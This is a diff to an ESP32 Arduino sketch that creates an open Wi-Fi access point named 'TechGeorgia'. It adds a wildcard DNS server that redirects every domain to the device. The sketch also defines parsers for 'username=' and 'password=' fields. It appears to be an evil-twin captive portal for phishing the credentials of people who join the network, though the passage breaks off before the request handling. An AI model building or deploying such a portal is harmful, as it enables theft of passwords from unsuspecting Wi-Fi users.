@@ -1,32 +1,37 @@
 #include "WiFi.h"
 #include <string.h>
 #include "site.h"
+#include <DNSServer.h>
 
 const char *ssid = "TechGeorgia";
-const char *password = "";
+const char *password = NULL;
 
+const byte DNS_PORT = 53;
+IPAddress apIP(192,168,4,1); // The default android DNS
+DNSServer dnsServer;
 WiFiServer server(80);
 
 String header;
-
-String output26State = "off";
-String output27State = "off";
 
 const char* USER_INPUT = "username=";
 const char* PASS_INPUT = "password=";
 
 void setup() {
   Serial.begin(115200);
-  WiFi.softAP(ssid, NULL);
+  WiFi.softAP(ssid, password);
 
   Serial.println();
   Serial.print("IP address :");
-  Serial.println(WiFi.softAPIP());
+  apIP = WiFi.softAPIP();
+  Serial.println(apIP);
+
+  dnsServer.start(DNS_PORT, "*", apIP);
   
   server.begin();
 }
 
 void loop(){
+  dnsServer.processNextRequest();
   WiFiClient client = server.available();
   if (client) {                             // If a new client connects,
     Serial.println("New Client.");          // print a message out in the serial port
